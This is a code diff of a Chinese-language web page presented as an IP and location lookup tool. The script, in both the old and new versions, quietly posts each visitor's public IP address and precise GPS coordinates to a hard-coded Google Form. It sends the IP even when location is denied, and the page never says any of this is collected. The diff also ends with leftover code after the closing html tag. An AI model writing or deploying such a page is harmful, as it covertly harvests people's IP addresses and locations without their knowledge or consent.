@@ -2,51 +2,41 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8" />
-  <title>IP检测与定位提交表单示例</title>
+  <title>IP与定位查询工具</title>
   <style>
     body { font-family: Arial, sans-serif; padding: 20px; }
     #status { margin-top: 20px; white-space: pre-wrap; }
+    button { margin-top: 10px; padding: 10px 15px; font-size: 16px; }
   </style>
 </head>
 <body>
-  <h1>IP检测与定位功能加载中...</h1>
-  <p id="info">请允许定位权限以确保功能正常</p>
+  <h1>IP与定位查询工具</h1>
+  <p>请允许定位权限以确保功能运作正常（点击按钮后才会请求定位权限）</p>
 
-  <button onclick="getIPOnly()">点击仅显示当前公网 IP</button>
-  <p id="ipOnlyResult"></p>
+  <button id="showIpBtn">显示当前公网 IP</button>
+  <button id="locateBtn">点击获取定位并查询国家</button>
+
+  <pre id="status">状态信息将显示在这里...</pre>
 
   <script>
     const googleFormURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSeWEBe4zv0G74aEItUIJIUhx-vcqLy4cVs_VO68Dqo0wN9H5w/formResponse";
 
-    // 谷歌表单字段ID示例（你按需替换）
     const entryIP = "entry.349181765";
     const entryLon = "entry.1434358418";
     const entryLat = "entry.99996352";
-    // 如果你表单有代理IP字段，可加上对应ID，比如：
-    // const entryProxy = "entry.XXXXXXX";
 
-    async function getIPOnly() {
-      const output = document.getElementById('ipOnlyResult');
-      output.textContent = "查询中……";
+    // 获取公网IP
+    async function getIP() {
       try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        output.textContent = "当前公网 IP 是：" + data.ip;
-      } catch (e) {
-        output.textContent = "获取失败：" + e.message;
-      }
-    }
-
-    async function fetchIP() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
+        let res = await fetch('https://api.ipify.org?format=json');
+        let data = await res.json();
         return data.ip;
       } catch {
         return "获取失败";
       }
     }
 
+    // 通过ip_country_ranges.json判断IP归属国家
     async function fetchCountryFromIP(ip) {
       const ipNum = ip.split('.').reduce((acc, val) => acc * 256 + Number(val), 0);
       try {
@@ -60,34 +50,16 @@
         }
         return '未知国家';
       } catch {
-        return '无法获取国家信息';
+        return '无法获取国家数据';
       }
     }
 
-    // 核心改动：定义代理检测函数，失败也返回说明字符串
-    async function checkIfProxy(ip) {
-      try {
-        // 注意：ip-api.com接口支持HTTP，https会报错
-        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,proxy`);
-        const data = await res.json();
-        if (data.status === "success") {
-          return data.proxy ? "该IP是代理IP" : "该IP不是代理IP";
-        } else {
-          return "代理检测失败：" + data.message;
-        }
-      } catch (e) {
-        return "代理检测异常：" + e.message;
-      }
-    }
-
-    // 表单提交函数，代理结果也一并提交（如果你表单有代理字段，需修改）
-    function postToGoogleForm(ip, lon, lat /*, proxyResult */) {
+    // 提交数据到Google表单
+    function postToGoogleForm(ip, lon, lat) {
       const formData = new FormData();
       formData.append(entryIP, ip);
       formData.append(entryLon, lon);
       formData.append(entryLat, lat);
-      // 如果有代理字段，取消注释：
-      // formData.append(entryProxy, proxyResult);
 
       fetch(googleFormURL, {
         method: 'POST',
@@ -96,43 +68,43 @@
       }).catch(console.error);
     }
 
-    async function main() {
-      const ip = await fetchIP();
+    // 显示IP按钮事件
+    document.getElementById('showIpBtn').addEventListener('click', async () => {
+      const status = document.getElementById('status');
+      status.textContent = "查询中……";
+      const ip = await getIP();
+      status.textContent = `当前公网 IP 是：${ip}`;
+    });
 
-      let infoText = "IP: " + ip + "，等待定位中...";
+    // 定位并查询国家按钮事件
+    document.getElementById('locateBtn').addEventListener('click', async () => {
+      const status = document.getElementById('status');
+      status.textContent = "查询IP中……";
+      const ip = await getIP();
 
       const country = await fetchCountryFromIP(ip);
-      infoText += "\n归属国家: " + country;
+      status.textContent = `IP: ${ip}\n归属国家: ${country}\n等待定位中……`;
 
-      const proxyResult = await checkIfProxy(ip);
-      infoText += "\n代理检测: " + proxyResult;
-
-      document.getElementById('info').textContent = infoText;
-
-      // 无论定位是否支持，最后都提交表单
       if (!navigator.geolocation) {
-        document.getElementById('info').textContent += "\n浏览器不支持定位功能";
-        postToGoogleForm(ip, "不支持", "不支持" /*, proxyResult */);
+        status.textContent += "\n浏览器不支持定位功能";
+        postToGoogleForm(ip, "不支持", "不支持");
         return;
       }
 
       navigator.geolocation.getCurrentPosition(position => {
-        const latNum = position.coords.latitude;
-        const lonNum = position.coords.longitude;
-
-        const latDir = latNum >= 0 ? 'N' : 'S';
-        const lonDir = lonNum >= 0 ? 'E' : 'W';
-
-        const lat = Math.abs(latNum).toFixed(6);
-        const lon = Math.abs(lonNum).toFixed(6);
-
-        document.getElementById('info').textContent += `\n经度: ${lon}${lonDir}\n纬度: ${lat}${latDir}`;
-        postToGoogleForm(ip, lonNum.toFixed(6), latNum.toFixed(6) /*, proxyResult */);
+        const lat = position.coords.latitude.toFixed(6);
+        const lon = position.coords.longitude.toFixed(6);
+        status.textContent += `\n经度: ${lon}\n纬度: ${lat}`;
+        postToGoogleForm(ip, lon, lat);
       }, err => {
-        document.getElementById('info').textContent += `\n定位失败：${err.message}`;
-        postToGoogleForm(ip, "失败", "失败" /*, proxyResult */);
+        status.textContent += `\n定位失败：${err.message}`;
+        postToGoogleForm(ip, "失败", "失败");
       }, {timeout: 15000});
-    }
+    });
+  </script>
+</body>
+</html>
+
 
     main();
   </script>
